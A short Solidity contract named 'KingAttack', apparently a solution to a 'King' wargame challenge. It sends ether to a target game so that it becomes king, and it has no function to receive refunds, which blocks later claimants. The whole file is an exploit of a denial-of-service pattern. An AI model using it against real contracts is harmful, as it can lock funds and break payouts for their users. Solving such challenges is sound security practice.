//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

interface A {
    function a() external payable;
}

contract KingAttack {

    constructor(address payable kingGameAddress) payable {
        A(kingGameAddress).a{value:msg.value}();
    }
} 